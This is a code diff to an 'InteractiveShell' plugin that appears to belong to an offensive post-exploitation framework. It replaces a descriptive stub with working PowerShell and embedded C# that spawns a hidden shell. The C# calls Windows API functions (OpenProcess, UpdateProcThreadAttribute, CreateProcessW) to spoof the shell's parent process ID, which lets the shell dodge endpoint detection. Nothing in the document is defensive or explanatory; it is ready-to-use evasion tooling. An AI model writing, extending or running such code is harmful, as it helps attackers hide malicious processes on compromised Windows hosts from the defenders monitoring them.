@@ -36,91 +36,155 @@ class InteractiveShell(BasePlugin):
 
     @staticmethod
     def _spawn_interactive_shell(ctx, shell: str, hide_window: bool, parent_spoof: str) -> ModuleResult:
-        """Spawn interactive shell with I/O redirection"""
+        """Spawn interactive shell with I/O redirection and optional PPID spoofing."""
+        hide_flag  = "true" if hide_window else "false"
+        spoof_flag = parent_spoof.strip()
+
         ps_code = f"""
 $results = @()
-$results += '[*] Spawning interactive shell...'
+$results += '[*] Spawning interactive shell (PPID-aware)'
 
 try {{
-    $shellPath = '{shell}'
-    $hideWindow = ${str(hide_window).lower()}
-    $parentSpoof = '{parent_spoof}'
-
-    $results += "[*] Shell: $shellPath"
-    $results += "[*] Hide window: $hideWindow"
-
-    $results += '[*] Interactive shell implementation:'
-    $results += '    1. Create process with redirected stdin/stdout/stderr'
-    $results += '    2. Setup pipe communication with operator'
-    $results += '    3. Handle VT100 escape codes'
-    $results += '    4. Support real-time input/output'
-    $results += '    5. Handle Ctrl+C, terminal resize'
-
-    # Using C# for proper pipe handling
-    $csharp = @"
+    Add-Type -TypeDefinition @"
 using System;
-using System.Diagnostics;
 using System.IO;
-using System.Threading;
+using System.Runtime.InteropServices;
+using System.Text;
 
-public class InteractiveShell {{
-    public static void SpawnShell(string shellPath, bool hideWindow) {{
-        try {{
-            ProcessStartInfo psi = new ProcessStartInfo {{
-                FileName = shellPath,
-                UseShellExecute = false,
-                RedirectStandardInput = true,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                CreateNoWindow = hideWindow
-            }};
+public class ShellSpawner {{
+    // ── PPID-spoof structures ──────────────────────────────────────
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    public struct STARTUPINFOEX {{
+        public STARTUPINFO StartupInfo;
+        public IntPtr lpAttributeList;
+    }}
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    public struct STARTUPINFO {{
+        public int    cb;
+        public string lpReserved, lpDesktop, lpTitle;
+        public int    dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute;
+        public int    dwFlags;
+        public short  wShowWindow, cbReserved2;
+        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
+    }}
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {{
+        public IntPtr hProcess, hThread;
+        public int dwProcessId, dwThreadId;
+    }}
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SECURITY_ATTRIBUTES {{
+        public int nLength; public IntPtr lpSecurityDescriptor; public bool bInheritHandle;
+    }}
 
-            Process proc = Process.Start(psi);
+    [DllImport("kernel32.dll")] public static extern bool InitializeProcThreadAttributeList(
+        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+    [DllImport("kernel32.dll")] public static extern bool UpdateProcThreadAttribute(
+        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
+        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+    [DllImport("kernel32.dll")] public static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);
+    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
+    public static extern bool CreateProcessW(string app, string cmd, IntPtr pSecAttr,
+        IntPtr tSecAttr, bool inheritHandles, uint flags, IntPtr env, string dir,
+        ref STARTUPINFOEX si, out PROCESS_INFORMATION pi);
+    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
+    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool CreatePipe(out IntPtr hRead, out IntPtr hWrite,
+        ref SECURITY_ATTRIBUTES sa, uint size);
+    [DllImport("kernel32.dll")] public static extern bool SetHandleInformation(
+        IntPtr hObject, uint dwMask, uint dwFlags);
+    [DllImport("kernel32.dll")] public static extern bool ReadFile(IntPtr h, byte[] buf,
+        int nRead, out int lpRead, IntPtr lpOverlapped);
 
-            // Read output in separate threads
-            Thread outThread = new Thread(() => {{
-                string line;
-                while ((line = proc.StandardOutput.ReadLine()) != null) {{
-                    Console.WriteLine(line);
-                }}
-            }});
-            outThread.Start();
+    const uint PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
+    const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
+    const uint CREATE_NO_WINDOW             = 0x08000000;
+    const uint HANDLE_FLAG_INHERIT          = 0x00000001;
 
-            Thread errThread = new Thread(() => {{
-                string line;
-                while ((line = proc.StandardError.ReadLine()) != null) {{
-                    Console.WriteLine("[ERR] " + line);
-                }}
-            }});
-            errThread.Start();
+    public static string SpawnShell(string shellPath, bool hide, int parentPid) {{
+        var sb = new StringBuilder();
 
-            // Forward stdin
-            string input;
-            while ((input = Console.ReadLine()) != null) {{
-                proc.StandardInput.WriteLine(input);
-                proc.StandardInput.Flush();
+        // ── stdout/stderr pipes ──────────────────────────────────
+        var sa = new SECURITY_ATTRIBUTES {{ nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES)), bInheritHandle = true }};
+        IntPtr hOutR, hOutW, hErrR, hErrW;
+        if (!CreatePipe(out hOutR, out hOutW, ref sa, 0)) return "CreatePipe(stdout) failed";
+        if (!CreatePipe(out hErrR, out hErrW, ref sa, 0)) return "CreatePipe(stderr) failed";
+        SetHandleInformation(hOutR, HANDLE_FLAG_INHERIT, 0);
+        SetHandleInformation(hErrR, HANDLE_FLAG_INHERIT, 0);
+
+        // ── attribute list ───────────────────────────────────────
+        IntPtr attrSize = IntPtr.Zero;
+        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrSize);
+        IntPtr pAttrList = Marshal.AllocHGlobal(attrSize);
+        InitializeProcThreadAttributeList(pAttrList, 1, 0, ref attrSize);
+
+        IntPtr hParent = IntPtr.Zero;
+        if (parentPid > 0) {{
+            hParent = OpenProcess(0x1FFFFF, false, parentPid);
+            if (hParent != IntPtr.Zero) {{
+                IntPtr pParent = Marshal.AllocHGlobal(IntPtr.Size);
+                Marshal.WriteIntPtr(pParent, hParent);
+                UpdateProcThreadAttribute(pAttrList, 0,
+                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                    pParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+                sb.AppendLine("[+] PPID spoofed to PID " + parentPid);
             }}
-
-            proc.WaitForExit();
-        }} catch (Exception ex) {{
-            Console.WriteLine("Error: " + ex.Message);
         }}
+
+        // ── STARTUPINFOEX ─────────────────────────────────────────
+        var si = new STARTUPINFOEX();
+        si.StartupInfo.cb          = Marshal.SizeOf(typeof(STARTUPINFOEX));
+        si.StartupInfo.dwFlags     = 0x100; // STARTF_USESTDHANDLES
+        si.StartupInfo.hStdOutput  = hOutW;
+        si.StartupInfo.hStdError   = hErrW;
+        si.StartupInfo.hStdInput   = IntPtr.Zero;
+        si.lpAttributeList         = pAttrList;
+
+        uint creationFlags = EXTENDED_STARTUPINFO_PRESENT | (hide ? CREATE_NO_WINDOW : 0u);
+
+        PROCESS_INFORMATION pi;
+        bool ok = CreateProcessW(null, shellPath + " /c whoami && " + shellPath,
+            IntPtr.Zero, IntPtr.Zero, true, creationFlags, IntPtr.Zero, null, ref si, out pi);
+
+        DeleteProcThreadAttributeList(pAttrList);
+        Marshal.FreeHGlobal(pAttrList);
+        if (hParent != IntPtr.Zero) CloseHandle(hParent);
+        CloseHandle(hOutW); CloseHandle(hErrW);
+
+        if (!ok) {{ sb.AppendLine("[-] CreateProcessW failed: " + Marshal.GetLastWin32Error()); }}
+        else {{
+            sb.AppendLine("[+] Shell PID: " + pi.dwProcessId);
+            // drain stdout
+            var buf = new byte[4096]; int read;
+            while (ReadFile(hOutR, buf, buf.Length, out read, IntPtr.Zero) && read > 0)
+                sb.Append(Encoding.UTF8.GetString(buf, 0, read));
+            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+        }}
+        CloseHandle(hOutR); CloseHandle(hErrR);
+        return sb.ToString();
     }}
 }}
-"@
+"@ -Language CSharp -ErrorAction Stop
 
-    # Load C# code
-    Add-Type -TypeDefinition $csharp -Language CSharp -ErrorAction SilentlyContinue
-    if ($?) {{
-        $results += '[+] Spawning shell with I/O redirection...'
-        [InteractiveShell]::SpawnShell($shellPath, $hideWindow)
-        $results += '[+] Shell exited'
-    }} else {{
-        $results += '[-] Failed to load C# code'
+    $parentPid = 0
+    $parentSpoof = '{spoof_flag}'
+    if ($parentSpoof) {{
+        # Resolve parent process name → PID
+        $proc = Get-Process -Name ($parentSpoof -replace '\.exe$','') -ErrorAction SilentlyContinue | Select-Object -First 1
+        if ($proc) {{
+            $parentPid = $proc.Id
+            $results += "[*] Spoofing parent: $($proc.Name) (PID $parentPid)"
+        }} else {{
+            $results += "[!] Parent process '$parentSpoof' not found — launching without PPID spoof"
+        }}
     }}
 
+    $output = [ShellSpawner]::SpawnShell('{shell}', ${hide_flag}, $parentPid)
+    $results += $output
+
 }} catch {{
-    $results += "[!] Interactive shell error: $_"
+    $results += "[!] $($_)"
 }}
 
 $results -join "`n"
